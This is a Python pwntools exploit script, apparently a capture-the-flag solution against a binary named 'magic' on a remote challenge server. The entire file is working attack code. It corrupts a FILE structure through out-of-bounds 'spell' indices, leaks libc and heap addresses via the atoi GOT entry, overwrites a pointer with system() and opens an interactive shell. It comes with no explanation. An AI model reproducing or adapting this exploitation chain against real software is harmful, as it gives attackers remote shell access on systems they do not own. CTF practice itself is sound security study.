from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./magic")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./magic")
else:
	p = remote("111.198.29.45","30793")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./magic")

def add(name):
	p.sendafter("choice>> ","1")
	p.sendafter(" name:",name)
	
def spell(index,name,test = True):
	p.sendafter("choice>> ","2")
	p.sendafter("spell:",str(index))
	if test:
		p.sendafter("name:",name)
	else:
		p.recvuntil("muggle!\n")

def last(index):
	p.sendafter("choice>> ","3")
	p.sendafter("chance:",str(index))

def debugf():
	#gdb.attach(p,"b *0x4009D0")
	gdb.attach(p,"b fread")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
add("a")
spell(0,"a"*0x20)
#debugf()
for i in range(0x10 - 3):
	spell(-2,"\x00")
spell(0,"\x60" + "\x00"*(0x10-2))
spell(-2,"\x00")
spell(0,p64(0) + p64(0x231) + p32(0xfbad24a8) + ";sh\x00" + p64(elf.got["atoi"]))
libc.address = u64(p.recv(8)) - libc.symbols["atoi"]
log.success("libc_base:" + hex(libc.address))
last(-2)
#debugf()
spell(-2,"\x00")
spell(-2,"\x00")
spell(-2,p64(0) + p64(0x231) + p32(0xfbad24a8) + ";sh\x00" + p64(0x6020E0))
heap_base = u64(p.recv(8)) - 0x10
log.success("heap_base:" + hex(heap_base))
for i in range(0x10 - 7):
	spell(-2,"\x00")
#debugf()
add("b")
spell(1,"\x00" * (0x20 - 7))
spell(1,p64(0)*2 + p64(heap_base + 0xe8 - 0x40 + 8) + p64(libc.symbols["system"]))
p.interactive()
